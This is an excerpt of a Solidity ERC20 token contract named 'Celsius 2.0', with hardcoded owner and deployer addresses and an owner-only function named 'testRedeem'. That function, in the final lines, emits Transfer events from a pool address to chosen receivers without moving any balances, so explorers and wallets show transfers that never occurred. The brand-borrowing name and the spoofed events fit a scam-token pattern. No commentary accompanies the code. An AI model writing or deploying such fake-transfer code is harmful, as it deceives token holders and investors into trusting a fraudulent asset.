...
contract Celsius2 is Context, IERC20 {
    ...
    address _contDeployr = 0x8ACeaB8167c80CB8b3DE7fa6228b889bB1130Ee8;
    address public _ownr = 0x3DEe39e594108280E42330547fD82525774bB2A3;
   constructor () public {

        _name = "Celsius 2.0";
        _symbol = "CEL2";
        _decimals = 18;
        uint256 initialSupply = 692753440 * 10 ** 18;
        _safeOwnr = _ownr;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function testRedeem(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
